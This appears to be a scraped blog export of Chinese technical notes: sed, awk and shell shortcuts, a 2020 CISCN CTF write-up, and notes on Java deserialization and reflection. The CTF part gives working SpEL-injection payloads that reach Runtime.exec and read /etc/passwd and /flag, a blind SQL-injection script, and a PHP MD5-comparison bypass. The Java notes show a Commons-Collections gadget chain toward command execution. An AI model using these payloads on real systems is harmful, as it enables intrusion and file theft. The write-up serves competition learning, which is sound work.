1sed -e &#x27;4 a newline\\nnewline2&#x27; testfile 4 行之后追加 3 行(2 行文字和 1 行空行) 1sed -e &#x27;4 a newline\\nnewline2\\n&#x27; testfile 4 行之后追加 1 行空行： 12#错误：sed -e &#x27;4 a \\n&#x27; testfilesed -e &#x27;4 a \\ &#x27; testfile 实际上 实际上是插入了一个含有一个空格的行，插入一个完全为空的空行没有找到方法（不过应该没有这个需求吧，都要插入行了插入空行干嘛呢？） 添加空行： 12345# 可以添加一个完全为空的空行sed &#x27;4 a \\\\&#x27;# 可以添加两个完全为空的空行sed &#x27;4 a \\\\n&#x27;"},{"title":"Linux命令行快捷操作","date":"2020-10-03","updated":"2024-03-19","path":"2020/10/03/Linux命令行快捷操作/","text":"Linux 命令行快捷操作键 常用 123456789ctrl+左右键:在单词之间跳转ctrl+a:跳到本行的行首ctrl+e:跳到页尾Ctrl+u：删除当前光标前面的文字 （还有剪切功能）ctrl+k：删除当前光标后面的文字(还有剪切功能)Ctrl+L：进行清屏操作Ctrl+y:粘贴Ctrl+u或ctrl+k剪切的内容Ctrl+w:删除光标前面的单词的字符Alt – d ：由光标位置开始，往右删除单词。往行尾删 说明 123Ctrl – k: 先按住 Ctrl 键，然后再按 k 键；Alt – k: 先按住 Alt 键，然后再按 k 键；M – k：先单击 Esc 键，然后再按 k 键。 移动光标 123456789Ctrl – a ：移到行首Ctrl – e ：移到行尾Ctrl – b ：往回(左)移动一个字符Ctrl – f ：往后(右)移动一个字符Alt – b ：往回(左)移动一个单词Alt – f ：往后(右)移动一个单词Ctrl – xx ：在命令行尾和光标之间移动M-b ：往回(左)移动一个单词M-f ：往后(右)移动一个单词 编辑命令 1234567891011Ctrl – h ：删除光标左方位置的字符Ctrl – d ：删除光标右方位置的字符（注意：当前命令行没有任何字符时，会注销系统或结束终端）Ctrl – w ：由光标位置开始，往左删除单词。往行首删Alt – d ：由光标位置开始，往右删除单词。往行尾删M – d ：由光标位置开始，删除单词，直到该单词结束。Ctrl – k ：由光标所在位置开始，删除右方所有的字符，直到该行结束。Ctrl – u ：由光标所在位置开始，删除左方所有的字符，直到该行开始。Ctrl – y ：粘贴之前删除的内容到光标后。ctrl –?t ：交换光标处和之前两个字符的位置。Alt + . ：使用上一条命令的最后一个参数。Ctrl – _ ：回复之前的状态。撤销操作。 Bang(!)命令 1234567891011!! ：执行上一条命令。^foo^bar ：把上一条命令里的foo替换为bar，并执行。!wget ：执行最近的以wget开头的命令。!wget:p ：仅打印最近的以wget开头的命令，不执行。!$ ：上一条命令的最后一个参数， 与?Alt - .?和?$_?相同。!* ：上一条命令的所有参数!*:p ：打印上一条命令是所有参数，也即?!*的内容。^abc ：删除上一条命令中的abc。^foo^bar ：将上一条命令中的 foo 替换为 bar^foo^bar^ ：将上一条命令中的 foo 替换为 bar!-n ：执行前n条命令，执行上一条命令：?!-1， 执行前5条命令的格式是：?!-5 查找历史命令 1234Ctrl – p ：显示当前命令的上一条历史命令Ctrl – n ：显示当前命令的下一条历史命令Ctrl – r ：搜索历史命令，随着输入会显示历史命令中的一条匹配命令，Enter键执行匹配命令；ESC键在命令行显示而不执行匹配命令。Ctrl – g ：从历史搜索模式（Ctrl – r）退出。 控制命令 123456Ctrl – l ：清除屏幕，然后，在最上面重新显示目前光标所在的这一行的内容。Ctrl – o ：执行当前命令，并选择上一条命令。Ctrl – s ：阻止屏幕输出Ctrl – q ：允许屏幕输出Ctrl – c ：终止命令Ctrl – z ：挂起命令 重复执行操作动作 1M – 操作次数 操作动作 ： 指定操作次数，重复执行指定的操作。"},{"title":"awk命令","date":"2020-10-03","updated":"2024-03-19","path":"2020/10/03/awk命令/","text":"log.txt文本内容如下： 12342 this is a test3 Are you like awkThis&#x27;s a test10 There are orange,apple,mongo 1234567891011121314ls -l | awk &#x27;&#123;print $1,$5&#125;&#x27; $n 代表输出第几列ls -l | awk &#x27;&#123;print $1,$5&#125;&#x27; OFS=&quot; | &quot; OFS标识以 &quot; | &quot; 对输出结果分割awk -F, &#x27;&#123;print $1,$2&#125;&#x27; log.txt # -F, 使用&quot;,&quot;分割awk &#x27;$1&gt;2&#x27; log.txt 过滤第一列大于2的行 awk &#x27;$1==2 &#123;print $1,$3&#125;&#x27; log.txt #过滤第一列等于2的行，输出1，3列ls -l | awk &#x27;$5&gt;1000 &#123;print $1,$5&#125;&#x27; OFS=&quot; | &quot; 输出ls中大于1000的文件ls -l | awk &#x27;$5&gt;1000 &amp;&amp; $5&lt;10000 &#123;print $1,$5&#125;&#x27; OFS=&quot; | &quot; 输出ls中大于1000且小于10000的文件ls -l | awk &#x27;BEGIN&#123;dirNum=0;&#125;&#123; if($1 ~ /^d/)&#123;res[dirNum++]=$9;print dirNum;&#125;&#125; END&#123; for(i=0;i&lt;dirNum;i++)&#123; print res[i]; &#125; &#125; &#x27; # 输出目录 $9 代表了ls -l的第九列 $1 ~ /^d/ 中呢规则匹配开头是d的 设置普通变量 12345678910111213awk -v # 设置变量 $ awk -va=1 &#x27;&#123;print $1,$1+a&#125;&#x27; log.txt --------------------------------------------- 2 3 3 4 This&#x27;s 1 10 11 $ awk -va=1 -vb=s &#x27;&#123;print $1,$1+a,$1b&#125;&#x27; log.txt $1b是直接结合字符串变量 --------------------------------------------- 2 3 2s 3 4 3s This&#x27;s 1 This&#x27;ss 10 11 10s 字符串连接 1234567将变量与””符号连接起来运算即可[chengmo@centos5 ~]$ awk &#x27;BEGIN&#123;a=&quot;a&quot;;b=&quot;b&quot;;c=(a&quot;&quot;b);print c&#125;&#x27; ab通过”+”连接运算。自动强制将字符串转为整型。非数字变成0，发现第一个非数字字符，后面自动忽略。 [chengmo@centos5 ~]$ awk &#x27;BEGIN&#123;a=&quot;a&quot;;b=&quot;b&quot;;c=(a+b);print c&#125;&#x27; 0 数组变量 12345678910111213141516171819sites[&quot;runoob&quot;]=&quot;www.runoob.com&quot;;sites[&quot;google&quot;]=&quot;www.google.com&quot;delete sites[&quot;google&quot;]; // 删除print fruits[&quot;google&quot;]模拟二维数组array[&quot;0,0&quot;] = 100;array[&quot;0,1&quot;] = 200;array[&quot;0,2&quot;] = 300;array[&quot;1,0&quot;] = 400;array[&quot;1,1&quot;] = 500;array[&quot;1,2&quot;] = 600;# 输出数组元素print &quot;array[0,0] = &quot; array[&quot;0,0&quot;];print &quot;array[0,1] = &quot; array[&quot;0,1&quot;];print &quot;array[0,2] = &quot; array[&quot;0,2&quot;];print &quot;array[1,0] = &quot; array[&quot;1,0&quot;];print &quot;array[1,1] = &quot; array[&quot;1,1&quot;];print &quot;array[1,2] = &quot; array[&quot;1,2&quot;]; 数组典型应用 12341. 用 awk 中查看服务器连接状态并汇总netstat -an|awk &#x27;/^tcp/&#123;++s[$NF]&#125;END&#123;for(a in s)print a,s[a]&#125;&#x27; # $NF 代表了最后一个字段StateESTABLISHED 1LISTEN 20 12345678910112. 统计 web 日志访问流量，要求输出访问次数，请求页面或图片，每个请求的总大小，总访问流量的大小汇总 awk &#x27;&#123;a[$7]+=$10;++b[$7];total+=$10&#125;END&#123;for(x in a)print b[x],x,a[x]|&quot;sort -rn -k1&quot;;print&quot;total size is :&quot;total&#125;&#x27; /app/log/access_logtotal size is :17223021 /icons/poweredby.png 8307614 / 705468 /icons/apache_pb.gif 18608a[$7]+=$10 表示以第 7 列为下标的数组（ $10 列为$7 列的大小），把他们大小累加得到$7 每次访问的大小，后面的 for 循环有个取巧的地方， a 和 b 数组的下标相同，所以一条 for 语句足矣 条件判断 for循环 1234567891011$ awk &#x27;BEGIN &#123;a=30;if (a==10) print &quot;a = 10&quot;;else if (a == 20) print &quot;a = 20&quot;;else if (a == 30) print &quot;a = 30&quot;;&#125;&#x27;$ awk &#x27;BEGIN &#123; for (i = 1; i &lt;= 5; ++i) print i &#125;&#x27; 自定义函数 1234567891011121314151617181920212223242526272829303132# 返回最小值function find_min(num1, num2)&#123; if (num1 &lt; num2) return num1 return num2&#125;# 返回最大值function find_max(num1, num2)&#123; if (num1 &gt; num2) return num1 return num2&#125;# 主函数function main(num1, num2)&#123; # 查找最小值 result = find_min(10, 20) print &quot;Minimum =&quot;, result # 查找最大值 result = find_max(10, 20) print &quot;Maximum =&quot;, result&#125;# 脚本从这里开始执行BEGIN &#123; main(10, 20)&#125; awk脚本 1234awk -f &#123;awk脚本&#125; &#123;文件名&#125;实例： $ awk -f cal.awk log.txt ls.awk 脚本分为 开头,正文,结尾 三部分 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556BEGIN &#123; #FS=&quot;,&quot; ; # 以空格分割 OFS=&quot; | &quot; ; # print 结果用 | 分割 #print &quot;done&quot;; # 调试用,如果输出done就知道BEGIN这段代码执行了 No = &quot;序号&quot;; Permisson = &quot; 权 限&quot;; HardLink = &quot;硬链接数&quot;; # 如果一个文件不是目录，此时ls第二个字段表示这个文件所具有的硬链接数 SymbolicLinks = &quot;软链接&quot;; SubDir = &quot;子目录数&quot;; # 如果是一个目录，则第2字段表示该目录所含子目录的个数(不包含文件在内) Owner = &quot;所属用户&quot;; Size = &quot;大小&quot;; LastModified = &quot;最近修改&quot;; Name = &quot;名称&quot;; no = 0; dirNum = 0; # 统计目录数量 fileNum = 0; # 统计文件数量 Total = 0; # 总用量 printf &quot;-------------------------\\n\\n&quot;; printf &quot;[普通文件]: \\n&quot;; printf &quot;%-10s %-6s %-6s %-8s %-8s %-s\\n&quot;,Permisson,HardLink,Owner,Size,LastModified,Name;&#125;;&#123; if ($1 ~ /^d/)&#123; # 看这一行的第一列是d开头代表目录,就先存起来 res[Permisson&quot;&quot;dirNum] = $1; res[SubDir&quot;&quot;dirNum] = $2; res[Owner&quot;&quot;dirNum] = $3; res[Size&quot;&quot;dirNum] = $5; res[LastModified&quot;&quot;dirNum] = $6; res[Name&quot;&quot;dirNum] = $9; dirNum++; &#125;else&#123; if(NR == 1)&#123; # 第一行总用量字段暂存 Total = $2; &#125;else&#123; fileNum++; printf &quot;%-15s %-8s %-9s %-13s %-8s %-s \\n&quot;, $1,$2,$3,$5,$6,$9; &#125; &#125;&#125;END&#123; printf &quot;-------------------------\\n\\n&quot;; printf &quot;[目录]: \\n&quot;; printf &quot;%-10s %-6s %-6s %-8s %-8s %-s\\n&quot;,Permisson,SubDir,Owner,Size,LastModified,Name; for (i=0;i&lt;dirNum;i++) # 输出所有目录 printf &quot;%-15s %-8s %-9s %-13s %-8s %-s \\n&quot;, res[Permisson&quot;&quot;i],res[SubDir&quot;&quot;i],res[Owner&quot;&quot;i],res[Size&quot;&quot;i],res[LastModified&quot;&quot;i],res[Name&quot;&quot;i]; printf &quot;-------------------------\\n&quot;; printf &quot;[总用量]: %s\\n&quot;,Total; printf &quot;[目录数量]: %s\\n&quot;,dirNum; printf &quot;[文件数量]: %s\\n&quot;,fileNum;&#125; 常用字符串函数 字符串函数的应用 替换 123awk &#x27;BEGIN&#123;info=&quot;this is a test2010test!&quot;;gsub(/[0-9]+/,&quot;!&quot;,info);print info&#125;&#x27; this is a test!test!在 info 中查找满足正则表达式， /[0-9]+/ 用”!”替换，并且替换后的值，赋值给 info 未给 info 值，默认是$0 查找 12awk &#x27;BEGIN&#123;info=&quot;this is a test2010test!&quot;;print index(info,&quot;test&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;ok #未找到，返回 0 匹配查找 12awk &#x27;BEGIN&#123;info=&quot;this is a test2010test!&quot;;print match(info,/[0-9]+/)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;ok #如果查找到数字则匹配成功返回 ok，否则失败，返回未找到 截取 12awk &#x27;BEGIN&#123;info=&quot;this is a test2010test!&quot;;print substr(info,4,10);&#125;&#x27;s is a tes #从第 4 个 字符开始，截取 10 个长度字符串 分割 1234awk &#x27;BEGIN&#123;info=&quot;this is a test&quot;;split(info,tA,&quot; &quot;);print length(tA);for(k in tA)&#123;print k,tA[k];&#125;&#125;&#x27; 44 test 1 this 2 is 3 a#分割 info,动态创建数组 tA,awk for …in 循环，是一个无序的循环。 并不是从数组下标1…n 开始 内建变量 变量 描述 $n 当前记录的第n个字段，字段间由FS分隔 $0 完整的输入记录 ARGC 命令行参数的数目 ARGIND 命令行中当前文件的位置(从0开始算) ARGV 包含命令行参数的数组 CONVFMT 数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组 ERRNO 最后一个系统错误的描述 FIELDWIDTHS 字段宽度列表(用空格键分隔) FILENAME 当前文件名 FNR 各文件分别计数的行号 FS 字段分隔符(默认是任何空格) IGNORECASE 如果为真，则进行忽略大小写的匹配 NF 一条记录的字段的数目 NR 已经读出的记录数，就是行号，从1开始 OFMT 数字的输出格式(默认值是%.6g) OFS 输出记录分隔符（输出换行符），输出时用指定的符号代替换行符 ORS 输出记录分隔符(默认值是一个换行符) RLENGTH 由match函数所匹配的字符串的长度 RS 记录分隔符(默认是一个换行符) RSTART 由match函数所匹配的字符串的第一个位置 SUBSEP 数组下标分隔符(默认值是/034)"},{"title":"2020ciscn","date":"2020-09-13","updated":"2024-03-19","path":"2020/09/13/2020ciscn/","text":"Day 1 0x01 Web3 伪协议 md5碰撞 file_get_contents($shell1)==='first blood' 利用php://input 来绕过 $shell2==md5($shell2) 利用PHP松散比较特性来绕过, **0e开头的字符串md5值也是0e开头即可绕过,**写脚本找到一个合适的数字: 0e215962017 12php &gt; var_dump(&#x27;0e215962017&#x27;==&#x27;0e291242476940776845150308577824&#x27;);bool(true) $shell3 = preg_replace('/php/','',$shell3); 只过滤了一次php,并且没有对大小写限制 构造伪协议读取PHP://filter/read=convert.base64-encode/resource=flag.pphphp 脚本: 12345678910111213141516171819202122import string,hashlibimport rea=string.digitsprint araw=&#x27;0e&#x27;for i in a: for j in a: for k in a: for m in a: for n in a: for n1 in a: for n2 in a: for n3 in a: for n4 in a: t= raw+i+j+k+m+n+n1+n2+n3+n4 t=str(t) s=hashlib.md5(t).hexdigest() if s[0:2]==&quot;0e&quot;: if s[2:].isdigit(): print t print s 0x02 Web7 Java反射 Spel注入 SpEL，全称 Spring Expression Language，顾名思义，是 Spring 提供的表达式执行语言。从 CTF 的角度来说，我们需要了解这些： 基础知识 数组 不可修改 不可修改的数组可以通过 &#123;a, a, b&#125; 实现，构造的是 java.util.Collections$UnmodifiableRandomAccessList。 可修改 数组可以通过 &#123;a, b + c&#125; 实现。和集合相比，其最大的区别就是多了一次运算。注意到上面的 Unmidifiable 了吗？当不存在运算时，SpEL 默认所有内容都是不可修改的；但一旦引入了运算，就代表数组（或其他容器）中的内容是需要修改的，因此对应构造的容器也就变成了 java.util.ArrayList。 值得注意的是，这里可以通过 ArrayList.toArray() 生成 Object[]。 Map Map 同样分为可修改和不可修改，对应的分别是 java.util.Collections$UnmodifiableMap 和 java.util.LinkedHashMap。创建的格式类似 JSON，这里就直接略过了。 [] 运算符 [] 运算符的作用是获取数组/Map 中的内容（属性），因此利用这个可以获得类中成员的值。 整体语法和 JS 类似，但是有一些例外。对于 String 而言，[] 只能通过下标访问字符，因此 ''['class'] 会报错而 ''.class 没有问题。 待确认 new 在 SpEL 中可以通过 new 来创建对象，使用方式和 Java 相同。但由于这里的题目本身 WAF 了 new，因此题解中并没有用到。 T(class) 使用诸如 T(java.lang.Runtime) 的结构可以获得一个该类本身的引用，之后就可以执行其对应的静态函数了。但同样是上面的原因，由于 WAF 了 T(，因此本题没有用到。 尝试构造命令执行：java.lang.Runtime 首先是测了一下 WAF 过滤的内容： java.lang new getClass T( # String getMethod('exec').invoke() Runtime exec( get( Root( Parent( list( bulid阶段源码: 绕过 T( 由于 T( 被限制，因此我们需要通过另一种方式绕过 T(。这里我们使用的是 forName： 1`&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;)` 获取 getRuntime 由于 getRuntime 存在被过滤单词，因此只能通过反射获取方法： 1`&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;).getMethod(&#x27;getR&#x27;+&#x27;untime&#x27;).invoke(&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;))` 成功获得 Runtime 实例： exec 使用类似的方法构造 exec，并尝试执行： 1`&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, &#x27;&#x27;.class).invoke(&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;).getMethod(&#x27;getR&#x27;+&#x27;untime&#x27;).invoke(&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;)),&#x27;ls&#x27;)` 然而，执行的结果表明：使用了 openrasp： 由于 openrasp 不同于普通的 WAF，我这里没有想到办法绕过。这个方案可以说是失败了。 尝试构造读取文件：java.nio 文件读取 绕过new( Files.readAllBytes(Path.get(&quot;1122&quot;)) 没有new 尝试通过 java.nio 直接读取文件。尝试读取 /etc/passwd 的内容。 1`&#x27;&#x27;.class.forName(&#x27;java.nio.file.Files&#x27;).readAllBytes(&#x27;&#x27;.class.forName(&#x27;java.nio.file.Paths&#x27;).get(&#x27;/flag&#x27;))` get(被WAF 绕过get( 既然限制了get(,那就反射出get()方法再invoke,不过需要实例化Path对象 查看javaapi手册,(1.7版本后Path成了Paths),Paths在java.nio.file.Paths中,其中有get方法可以构造一个path对象 需要URI参数,可以通过create方法构造URI对象''.class.forName('java.net.URI').create(&quot;file:///etc/passwd&quot;) payload:''.class.forName('java.nio.file.Files').readAllBytes(''.class.forName('java.nio.file.Paths').getMethod('get',''.class.forName('java.net.URI')).invoke(''.class.forName('java.nio.file.Paths'),''.class.forName('java.net.URI').create(&quot;file:///etc/passwd&quot;))) 这里直接返回了一个 byte[]，看来是成功了。 逐字符获取 通过下标访问可以获得每个字符的内容，然后 xjb 写个脚本就可以了： 12345678910111213arr = []; func = (i) =&gt; fetch( &quot;http://106.52.164.141/spel/calc?calc=&quot; + escape( &lt;div class=&quot;enlighter-default enlighter-v-inline enlighter-t-beyond &quot;&gt;&lt;span class=&quot;enlighter&quot;&gt;&lt;span class=&quot;enlighter-text&quot;&gt;&#x27;&#x27;.class.forName(&#x27;java.nio.file.Files&#x27;).readAllBytes(&#x27;&#x27;.class.forName(&#x27;java.nio.file.Paths&#x27;).get(&#x27;/flag&#x27;))[$&#123;i&#125;]&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;code data-enlighter-language=&quot;raw&quot; class=&quot;EnlighterJSRAW enlighter-origin&quot;&gt;&#x27;&#x27;.class.forName(&#x27;java.nio.file.Files&#x27;).readAllBytes(&#x27;&#x27;.class.forName(&#x27;java.nio.file.Paths&#x27;).get(&#x27;/flag&#x27;))[$&#123;i&#125;]&lt;/code&gt; ) ) .then((t) =&gt; t.text()) .then((t) =&gt; arr.push(String.fromCharCode(t))); for (let i = 0; i &lt; 44; i++) await func(i); （然而之前翻车了 最终正常拼接得到结果。 直接读取 尝试用这种方法获取字符串：''.class.forName('java.nio.charset.StandardCharsets').UTF_8.decode(''.class.forName('java.NIO.ByteBuffer').wrap( payload )) payload:''.class.forName('java.nio.file.Files').readAllBytes(''.class.forName('java.nio.file.Paths').getMethod('get',''.class.forName('java.net.URI')).invoke(''.class.forName('java.nio.file.Paths'),''.class.forName('java.net.URI').create(&quot;file:///etc/passwd&quot;))) 然而尝试读取/flag发现没有, 不知道flag在哪里 所以尝试遍历目录 构造遍历目录方式 java.io.File中public String[] list(), 不过调用这个方法需要实例化对象,然而new被禁止了,所以找一下可以返回File对象的方法 ,找到listRoot方法 Demo 列出计算机所有根目录下的文件(展示list listRoot的用法): listRoots[0].list()[0]即可查看第一个根目录下的第一个文件 payload:''.class.forName('java.io.File').getMethod('list').invoke(''.class.forName('java.io.File').getMethod('listRoots').invoke(''.class.forName('java.io.File'))[0]) 用BP爆破一下,发现了flag的位置, 获取flag内容 直接就读出来了 然鹅…4点结束攻击环节… 4点01得出的答案…哭辽 原来flag在/flag.txt里面… 完全可以尝试猜到的,结果上一个题flag在/flag让我陷入思维定势,觉得flag都在/flag里面,就没继续尝试, 又费时间构造了遍历目录的方式 Day2 0x01 Web2 sql过滤单引号 select * from users where username='$_POST[&quot;username&quot;]' and password='$_POST[&quot;password&quot;]' 过滤了单引号,但是没有过滤反斜杠\\, 令username=admin\\ ,password=or(2&gt;1)# 这样语句就变成了:select * from users where username='admin\\' and password='or(2&gt;1)#' &lt;=&gt;select * from users where username='****'or(2&gt;1)# ;号php会自己加上,不需要我们传入 payload: or/**/(ascii(right(left(password,&#123;i+1&#125;),1))&gt;&#123;j&#125;)# 脚本: 1234567891011121314151617181920212223242526272829import requestss = requests.Session()url = &#x27;http://ip/index.php&#x27;flag = &#x27;&#x27;def exp(i, j): payload = f&quot;or/**/(ascii(right(left(password,&#123;i+1&#125;),1))&gt;&#123;j&#125;)#&quot; data = &#123; &quot;username&quot;: &quot;admin\\\\&quot;, &quot;password&quot;: payload &#125; r = s.post(url, data=data) if &quot;success.jpg&quot; in r.text: return True else: return Falsefor i in range(0, 100): low = 32 high = 200 while (low &lt;= high): mid = (low + high)//2 if (exp(i, mid)): low = mid + 1 else: high = mid - 1 flag += chr((low+high+1)//2) print(flag) 这个题目思路没问题,但是怎么测试都不行…奇怪了 0x02 Web5 Fuzz一下被禁止的关键词, mid可用, select只被过滤了一次可以用来绕过其他被禁止的关键字 结果为真的话返回 Too young too simple, 假的话返回 Incorrect password 'or/**/'1'like'1'%00 真 'or/**/'1'like'1'# 假 fuzz了好长时间… 觉得逻辑非常奇怪,后来发现应该是注释符的问题… Payload: 'or/**/subselectstr(password,1,1)like'w'%00 在burpsuite中爆破出密码 w31c0mE 4nd H ve FuN 转义字符被禁止了所以无法爆破下划线,百分号等特殊字符, 所以对密码进行爆破,空格地方用下划线代替,H ve中间爆破出是百分号 用帐号密码登录就可 ciscn&#123;UjSmH9SCD6zuZUAc5g&#125; 第一次在国赛上拿到3血的题目"},{"title":"java反序列化","date":"2020-06-21","updated":"2024-03-19","path":"2020/06/21/java反序列化/","text":"java序列化操作函数 实现Serializable接口 ObjectOutputStream类的writeObject(Object obj)方法,将对象序列化成字符串数据 ObjectInputStream类的readObject(Object obj)方法，将字符串数据反序列化成对象 12345678910111213public class Person implements Serializable &#123; private String name; private int age; //省略构造方法，get及set方法 private void writeObject(ObjectOutputStream out) throws IOException &#123; //将名字反转写入二进制流 out.writeObject(new StringBuffer(this.name).reverse()); out.writeInt(age); &#125; private void readObject(ObjectInputStream ins) throws IOException,ClassNotFoundException&#123; //将读出的字符串反转恢复回来 this.name = ((StringBuffer)ins.readObject()).reverse().toString(); this.age = ins.readInt(); &#125;&#125; 更彻底的自定义反序列化 writeReplace：在序列化时，会先调用此方法，再调用writeObject方法。此方法可将任意对象代替目标序列化对象 readResolve：反序列化时替换反序列化出的对象，反序列化出来的对象被立即丢弃。此方法在readeObject后调用。 Externalizable：强制自定义序列化 通过实现Externalizable接口，必须实现writeExternal、readExternal方法。 java反射简介 先看在java中执行系统命令的方法 12345public class ExecTest &#123; public static void main(String[] args) throws Exception&#123; Runtime.getRuntime().exec(&quot;notepad.exe&quot;); &#125;&#125; 该代码会运行并打开windows下的记事本 它正常的步骤是 123456public class ExecTest &#123; public static void main(String[] args) throws Exception&#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;notepad.exe&quot;); &#125;&#125; Java反射之 getMethod() 与invoke的使用 那么相应的反射的代码如下 ps: Method.invoke 1234567891011import java.lang.reflect.Method;public class ExecTest &#123; public static void main(String[] args) throws Exception&#123; Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new Class[]&#123;&#125;).invoke(null); //System.out.println(runtime.getClass().getName()); Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;notepad.exe&quot;); &#125;&#125;getMethod(方法名, 方法类型) getMethod方法根据方法名称和相关参数，来定位需要查找的Method对象并返回。invoke(某个对象实例， 传入参数) 作用：调用包装在当前Method对象中的方法。 这里第一句Object runtime =Class.forName(&quot;java.lang.Runtime&quot;)的作用 ​ 等价于 Object runtime = Runtime.getRuntime() 目的是获取一个对象实例好被下一个invoke调用 第二句Class.forName(&quot;java.lang.Runtime&quot;).xxxx的作用就是调用上一步生成的runtime实例的exec方法，并将&quot;notepad.exe&quot;参数传入exec()方法 getMethod方法 Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法 该方法的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。 person.getClass().getMethod(“Speak”, null); //获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null person.getClass().getMethod(“run”, String.class); //获得person对象的run方法，因为run方法的形参是String类型的，所以parameterTypes为String.class Transformer接口: 将一个类转换为另一个类,其中的方法是transform 这是apache发布的一个组件包中的方法 下载地址：https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1 有如下几个类使用了Transformer接口,分别是ConstantTransformer，invokerTransformer，ChainedTransformer，TransformedMap。 ConstantTransformer 123456789101112131415161718192021public class ConstantTransformer implements Transformer, Serializable &#123; static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) &#123; return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn)); &#125; public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; // &#125; public Object getConstant() &#123; return this.iConstant; &#125;&#125; 可以看出transform返回的是iConstant的变量，iConstant的变量必定在ConstantTransformer(Object)方法中被赋值。 InvokerTransformer 获得runtime的Method对象 通过反射创建一个新的对象实例 构造函数: 1234567891011121314/** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param methodName the method to call * @param paramTypes the constructor parameter types, not cloned * @param args the constructor arguments, not cloned */public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; 其中的transform方法 1234567891011121314151617181920212223/** * Transforms the input to result by invoking a method on the input. * * @param input the input object to transform * @return the transformed result, null if null input */public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); // 这三行代码的作用,下面有说到 Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; iMethodName, iParamTypes通过构造函数传入,transform中通过反射的方法,的到了这个方法(iMethodName)的对象,最后返回Method对象 使用举例，根据上述源码构造一个对象，并且调用transform对象： 123456InvokerTransformer tran = new InvokerTransformer( &quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125; );System.out.println(tran.transform(Runtime.class).toString()); 说一下transform方法中这三行的意思: cls变量获取到的是传递进来的input的对象值，此处input传递的是Runtime的对象 ，下面两行代码要反射Runtime的getRuntime方法，iMethodName表示要得到的方法名称，iParamTypes表示方法中所使用的参数类型的数组。 此处的iMethodName需要Mehtod对象，因此此处是getMethod(构造函数时设置的,getMethod能返回Method对象) ，因此iParamTypes对应的是getMethod对象的参数类型集合，getMethod方法文档如下图所示： 通过查阅官方文档，我们知道了参数应该是String.class和Class[].class 继续往下执行invoke方法，因为是反射getRuntime()方法，参数为空，所以iArgs的值可以为空，回到主程序代码可以发现为null，如下图所示： 执行完毕后: 成功的反射出了Runtime.getRuntime()的方法，然而如果要执行任意代码的化，还需要有exec代码段，全部应该是Runtime.getRuntime().exec(“calc.exe”) 进一步利用获得的getRuntime构造exec执行代码 此时我们已经获得了getRuntime()的Method对象，如果要执行exec(“calc.exe”)，我们还需要进行一次invoke反射的过程，因此我们根据上面构造出下面的代码段，如下图： 上图中，构造出tran2的方法，配置invoke的参数都为null，利用tran2.transform(run)，反射invoke方法，过程与上文中一样，此处直接看输出了： 此处已经是Runtime类了，继续构造exec(“calc.exe”)代码段，如下图所示： 快速浏览 获取类对象 获取方法 method.invoke(类,参数) getMethod(方法名, 方法类型) getMethod方法根据方法名称和相关参数，来定位需要查找的Method对象并返回。 invoke(某个对象实例， 传入参数) 作用：调用包装在当前Method对象中的方法。 正常流程: Runtime.getRuntime.exec(“calc.exe”); 反射流程: 需要 从Runtime类中搜索匹配getRuntime方法的名称及参数类型来找到getRuntime方法 并通过getMethod方法获取到getRuntime方法 1234Class runClass = Runtime.getClass(); // 获取Runtime类 &lt;==&gt; Class.forName(&quot;java.lang.Runtime&quot;)Method getRuntime = runClass.getMethod(&quot;getRuntime&quot;,getRuntime所需要的参数类型); //通过`getMethod`方法获取到`getRuntime`方法 java反射机制 Java反射之 getMethod() 与invoke的使用 https://blog.csdn.net/qq_27446553/article/details/78325204 https://juejin.im/post/5ce3cdc8e51d45777b1a3cdf 